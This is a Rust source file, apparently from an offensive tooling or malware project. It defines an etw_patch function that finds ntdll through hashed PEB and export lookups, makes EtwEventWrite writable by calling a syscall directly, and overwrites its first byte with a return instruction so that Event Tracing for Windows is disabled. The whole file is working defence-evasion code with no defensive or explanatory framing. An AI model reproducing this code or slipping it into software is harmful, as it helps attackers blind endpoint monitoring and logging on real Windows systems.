use windows_sys::Win32::System::Memory::PAGE_EXECUTE_WRITECOPY;
use crate::utils::Pe::PeGetFuncEat;
use crate::utils::Peb::PebGetModule;
use crate::syscall;
use crate::utils::resolve_syscalls::do_syscall;

pub fn etw_patch(enable: u32) {
    unsafe {
        let hNtdll = PebGetModule(0x1edab0ed);
        let len: u64 = 0x08;
        let mut oldProtect = 0;
        let patchsize = 1;
        let mut patchbytes: [u8;1] = [0xc3];
        if enable == 0 {
            patchbytes[0] = 0x4c;
        }

        let EtwEventWrite: *mut u8 = std::mem::transmute(PeGetFuncEat(hNtdll,  0x58defae2));

        syscall!(std::mem::transmute(PeGetFuncEat(hNtdll, 0x50e92888)), 0xffffffffffffffff as *mut u64, &(EtwEventWrite.clone()), &len, PAGE_EXECUTE_WRITECOPY, &mut oldProtect);

        std::ptr::copy_nonoverlapping(patchbytes.as_mut_ptr(), EtwEventWrite, patchsize);

        syscall!(std::mem::transmute(PeGetFuncEat(hNtdll, 0x50e92888)), 0xffffffffffffffff as *mut u64, &(EtwEventWrite.clone()), &len, oldProtect, &mut oldProtect);
    }
}